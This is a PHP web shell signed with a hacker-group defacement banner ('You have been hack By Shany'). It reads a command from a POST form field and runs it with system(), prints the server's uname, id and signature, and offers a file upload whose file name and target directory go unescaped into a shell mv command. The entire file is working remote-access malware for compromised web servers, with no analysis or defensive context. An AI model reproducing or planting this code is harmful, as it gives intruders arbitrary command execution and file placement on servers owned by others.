<?php

set_magic_quotes_runtime(0);

echo '<style>body{font-family:trebuchet ms;font-size:16px;}hr{width:100%;height:2px;}</style>';
echo '<center><h1>#worst @dal.net</h1></center>';
echo '<center><h1>You have been hack By Shany with Love To #worst.</h1></center>';
echo '<center><h1>Watch Your system Shany was here.</h1></center>';
echo '<center><h1>Linux Shells</h1></center>';
echo '<hr><hr>';

$currentWD = str_replace('\\\\', '\\', $_POST['_cwd']);
$currentCMD = str_replace('\\\\', '\\', $_POST['_cmd']);

$UName = `uname -a`;
$SCWD = `pwd`;
$UserID = `id`;

if ('' == $currentWD) {
    $currentWD = $SCWD;
}

echo '<table>';
echo '<tr><td><b>We are:</b></td><td>' . $_SERVER['REMOTE_HOST'] . ' (' . $_SERVER['REMOTE_ADDR'] . ')</td></tr>';
echo '<tr><td><b>Server is:</b></td><td>' . $_SERVER['SERVER_SIGNATURE'] . '</td></tr>';
echo "<tr><td><b>System type:</b></td><td>$UName</td></tr>";
echo "<tr><td><b>Our permissions:</b></td><td>$UserID</td></tr>";
echo '</table>';

echo '<hr><hr>';

if ('List files!' == $_POST['_act']) {
    $currentCMD = 'ls -la';
}

echo '<form method=post enctype="multipart/form-data"><table>';

echo '<tr><td><b>Execute command:</b></td><td><input size=100 name="_cmd" value="' . $currentCMD . '"></td>';
echo '<td><input type=submit name=_act value="Execute!"></td></tr>';

echo '<tr><td><b>Change directory:</b></td><td><input size=100 name="_cwd" value="' . $currentWD . '"></td>';
echo '<td><input type=submit name=_act value="List files!"></td></tr>';

echo '<tr><td><b>Upload file:</b></td><td><input size=85 type=file name=_upl></td>';
echo '<td><input type=submit name=_act value="Upload!"></td></tr>';

echo '</table></form><hr><hr>';

$currentCMD = str_replace('\\"', '"', $currentCMD);
$currentCMD = str_replace("\\\'", "\'", $currentCMD);

if ('Upload!' == $_POST['_act']) {
    if (UPLOAD_ERR_OK != $_FILES['_upl']['error']) {
        echo '<center><b>Error while uploading file!</b></center>';
    } else {
        echo '<center><pre>';
        system('mv ' . $_FILES['_upl']['tmp_name'] . ' ' . $currentWD . '/' . $_FILES['_upl']['name'] . ' 2>&1');
        echo '</pre><b>File uploaded successfully!</b></center>';
    }
} else {
    echo "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = 'cd ' . $currentWD . ';' . $currentCMD;
    system($currentCMD);
    echo "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Command completed</b></center>";
}

exit;
